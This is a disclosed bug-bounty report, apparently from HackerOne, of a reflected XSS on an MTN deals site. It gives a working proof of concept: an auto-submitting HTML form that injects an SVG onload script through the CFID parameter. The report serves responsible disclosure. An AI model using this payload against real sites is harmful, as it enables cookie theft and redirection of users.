# POST BASED REFLECTED XSS IN dailydeals.mtn.co.za

## Report Details
- **Report ID**: 1451394
- **URL**: https://hackerone.com/reports/1451394
- **State**: Closed
- **Severity**: high
- **Submitted**: 2022-01-17T11:44:48.945Z
- **Disclosed**: 2022-07-15T09:56:35.123Z

## Reporter
- **Username**: shuvam321
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: mtn_group

## Vulnerability Information
## Summary:
Dear Team ,
I have found a post based reflected XSS in https://dailydeals.mtn.co.za/ .

## Steps To Reproduce:

1.Create a html file with following content .

<form action="https://dailydeals.mtn.co.za/index.cfm?GO=CRAVE_ESTABLISHMENTS_LIST" method="POST"><input type="hidden" name="location_id" value="0"><input type="hidden" name="suburb" value="0"><input type="hidden" name="search_phrase" value=""><input type="hidden" name="submit_search" value="Search"><input type="hidden" name="m" value=""><input type="hidden" name="cpID" value=""><input type="hidden" name="CFID" value="a611fd5d-822a-4c08-a032-bcac1551f032'&quot;<!--><Svg OnLoad=(confirm)(1)-->"><input type="hidden" name="CFTOKEN" value="0"></form><script>document.forms[0].submit()</script>

2.Open the HTML file in any web-browser. 
  
3.Cross site Scripting will be triggered .

## Impact

Attacker can exploit this vulnerability to steal users cookies , redirect them to arbitrary domain and perform various attacks.

## Attachments
- Screenshot_from_2022-01-17_06-44-08.png
- Screenshot_from_2022-01-17_06-43-01.png
- POC.HTML
